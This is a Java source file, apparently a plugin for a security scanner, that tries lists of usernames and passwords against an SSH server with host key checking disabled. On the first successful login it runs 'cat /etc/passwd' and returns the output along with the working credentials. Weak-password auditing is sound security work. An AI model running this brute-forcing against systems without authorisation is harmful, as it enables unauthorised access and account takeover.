package com.tiji.plugin.plugin;

import com.jcraft.jsch.ChannelExec;
import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.Session;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.List;
import java.util.Map;
import java.util.Properties;

/**
 * @author 贰拾壹
 * @create 2020-04-03 17:06
 */
public class JavaSSHWeakPass {
    public static StringBuilder check(String ip, String port, String cmd, String timeout, Map<String, List<String>> payloadMap) {
        //防止
        if (!"cat /etc/passwd".equals(cmd)) {
            return null;
        }

        List<String> usernameList = payloadMap.get("username");
        List<String> passwordList = payloadMap.get("password");
        StringBuilder resultStringBuilder = new StringBuilder();
        boolean usernameFlag = false;
        JSch jsch = new JSch();
        for (String username : usernameList) {
            if (usernameFlag) {
                break;
            }
            for (String password : passwordList) {
                try {
                    Session session = jsch.getSession(username, ip, Integer.parseInt(port));
                    session.setPassword(password);
                    session.setTimeout(Integer.parseInt(timeout));
                    Properties config = new Properties();
                    //在代码里需要跳过检测, 否则会报错找不到主机
                    config.put("StrictHostKeyChecking", "no");
                    session.setConfig(config);
                    session.connect();

                    ChannelExec channelExec = (ChannelExec) session.openChannel("exec");
                    channelExec.setCommand(cmd);
                    channelExec.setInputStream(null);
                    channelExec.setErrStream(null);
                    channelExec.connect();
                    try (BufferedReader in = new BufferedReader(new InputStreamReader(channelExec.getInputStream()))) {
                        String result;
                        while ((result = in.readLine()) != null) {
                            resultStringBuilder.append(result).append("\n");
                        }
                        resultStringBuilder.insert(0, "用户名密码: " + username + ":" + password + "\n");
                        in.close();
                        channelExec.disconnect();
                        session.disconnect();
                        usernameFlag = true;
                        break;
                    } catch (IOException ignored) {
                    }
                } catch (JSchException e) {
                    //System.err.println(e.getMessage() + " " + ip + ":" + port + " => " + username + ":" + password);
                }
            }
        }
        return resultStringBuilder;
    }
}
